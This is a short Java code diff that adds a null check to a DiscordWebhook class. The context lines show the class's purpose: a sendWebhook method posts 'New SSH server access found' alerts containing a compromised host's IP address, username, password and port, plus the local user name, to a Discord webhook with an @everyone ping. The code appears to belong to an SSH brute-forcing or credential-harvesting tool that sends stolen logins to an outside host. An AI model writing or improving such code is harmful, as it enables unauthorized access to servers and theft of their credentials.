@@ -386,7 +386,7 @@ public class DiscordWebhook {
     }
 
     public void sendWebhook(final String host, final String username, final String password, final int port) {
-        if (this.url.equals("")) return;
+        if (this.url == null || this.url.equals("")) return;
         this.setContent("@everyone");
         this.addEmbed(new DiscordWebhook.EmbedObject().setTitle("**New SSH server access found (" + System.getProperty("user.name") + ")**").addField("**IP Address**", host, false).addField("**User**", username, false).addField("**Password**", password, false).addField("**Port**", String.valueOf(port), false).setColor(Color.GREEN));
         try {
